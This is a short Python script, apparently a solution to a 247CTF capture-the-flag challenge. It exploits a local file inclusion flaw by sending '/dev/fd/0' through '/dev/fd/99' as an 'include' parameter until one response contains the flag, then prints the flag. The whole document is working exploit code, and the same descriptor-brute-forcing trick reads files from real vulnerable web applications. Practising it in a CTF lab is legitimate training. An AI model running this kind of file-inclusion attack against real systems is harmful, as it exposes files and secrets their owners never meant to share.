
```python
import requests

ctf_url = "https://e08d82a7fddb1625.247ctf.com"
print("Bruteforcing file descriptors to find open flag.txt file...")
for i in range(100):
    resp = requests.get(f"{ctf_url}", [("include", f"/dev/fd/{i}")])
    flag_start = resp.text.find("247CTF{")
    if flag_start != -1:
        flag_end = resp.text.find("}", flag_start)
        print(f"Found flag through file descriptor '{i}':", resp.text[flag_start:flag_end + 1])
        break
else:
    print("Failed to find open file descriptor!")
```
